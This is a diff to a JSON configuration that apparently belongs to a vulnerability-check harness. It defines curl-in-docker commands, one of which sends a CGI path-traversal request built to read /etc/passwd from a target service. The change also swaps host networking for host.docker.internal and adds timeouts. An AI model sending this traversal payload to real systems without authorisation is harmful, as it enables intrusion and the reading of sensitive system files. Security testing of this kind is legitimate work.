@@ -36,15 +36,17 @@
       "args": [
         "run",
         "--rm",
-        "--network",
-        "host",
+        "--add-host",
+        "host.docker.internal:host-gateway",
         "curlimages/curl:8.5.0",
         "-sS",
         "-D",
         "-",
         "-o",
         "/dev/null",
-        "http://{target}:{port}/"
+        "--max-time",
+        "20",
+        "http://host.docker.internal:{port}/"
       ],
       "timeout": 60
     },
@@ -56,13 +58,15 @@
       "args": [
         "run",
         "--rm",
-        "--network",
-        "host",
+        "--add-host",
+        "host.docker.internal:host-gateway",
         "curlimages/curl:8.5.0",
         "-sS",
         "-w",
-        "\\nHTTP_CODE:%{http_code}\\n",
-        "http://{target}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        "\nHTTP_CODE:%{http_code}\n",
+        "--max-time",
+        "20",
+        "http://host.docker.internal:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
       ],
       "timeout": 60
     },
